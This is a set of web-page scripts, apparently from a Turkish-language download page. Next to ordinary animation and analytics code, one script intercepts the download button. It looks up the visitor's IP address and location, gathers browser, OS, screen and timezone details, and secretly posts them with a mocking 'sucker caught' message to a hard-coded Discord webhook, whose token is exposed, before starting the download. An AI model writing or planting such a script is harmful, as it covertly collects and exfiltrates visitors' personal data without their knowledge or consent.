<script>
const reveals=document.querySelectorAll(".reveal");
const obs=new IntersectionObserver(entries=>{
  entries.forEach(e=>{
    if(e.isIntersecting)e.target.classList.add("show");
  });
},{threshold:.2});
reveals.forEach(r=>obs.observe(r));
</script>
<script>
document.addEventListener("DOMContentLoaded", () => {
    const btn = document.querySelector(".download_btn");
    if (!btn) return;

    function getOS() {
        const ua = navigator.userAgent;
        if (ua.includes("Windows")) return "Windows";
        if (ua.includes("Mac")) return "macOS";
        if (ua.includes("Linux")) return "Linux";
        return "Unknown";
    }

    function getBrowser() {
        const ua = navigator.userAgent;
        if (ua.includes("Firefox")) return "Firefox";
        if (ua.includes("Edg")) return "Edge";
        if (ua.includes("Chrome")) return "Chrome";
        if (ua.includes("Safari")) return "Safari";
        return "Unknown";
    }

    function getDeviceType() {
        return /Mobi|Android/i.test(navigator.userAgent) ? "Mobil" : "Masaüstü";
    }

    btn.addEventListener("click", async (e) => {
        e.preventDefault();

        let ipData = {};
        try {
            const res = await fetch("https://ipapi.co/json/");
            ipData = await res.json();
        } catch {}

        const payload = {
            embeds: [{
                title: "🧲 Yeni İndirme",
                description: "enayi oc dusuyo",
                color: 0x8a2be2,
                fields: [
                    {
                        name: "🌍 Konum Bilgileri",
                        value:
`🇺🇳 Ülke: ${ipData.country_name || "Unknown"}
🏙️ Şehir: ${ipData.city || "Unknown"}
🌐 IP Adresi: ${ipData.ip || "Unknown"}
🗺️ Bölge: ${ipData.region || "Unknown"}`
                    },
                    {
                        name: "💻 Cihaz Bilgileri",
                        value:
`🌐 Tarayıcı: ${getBrowser()}
🖥️ İşletim Sistemi: ${getOS()}
📱 Cihaz Türü: ${getDeviceType()}
🧩 Platform: ${navigator.platform || "Unknown"}`
                    },
                    {
                        name: "⬇️ İndirme Detayları",
                        value:
`📅 Tarih: ${new Date().toLocaleDateString("tr-TR")}
⏰ Saat: ${new Date().toLocaleTimeString("tr-TR")}
🌎 Zaman Dilimi: ${Intl.DateTimeFormat().resolvedOptions().timeZone}`
                    },
                    {
                        name: "➕ Ek Bilgiler",
                        value:
`🖥️ Ekran Çözünürlüğü: ${screen.width}x${screen.height}
🎨 Renk Derinliği: ${screen.colorDepth} bit
🌐 Dil: ${navigator.language}
🟢 Online Durum: ${navigator.onLine ? "Çevrimiçi" : "Offline"}`
                    }
                ],
                timestamp: new Date().toISOString()
            }]
        };

        fetch("https://discord.com/api/webhooks/1471796562379407476/TR_1wZOefN3W4-HL6DcrNvQvUpMeaAIcz6MIfV6vzqVQjvWPeM-3ldx9yc5ReqKQdETD", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
        });

        window.open(btn.href, "_blank");
    });
});
</script>
<script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"version":"2024.11.0","token":"1996e1cb1a2041bdafded9584aed6ec8","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"> 
 </script>
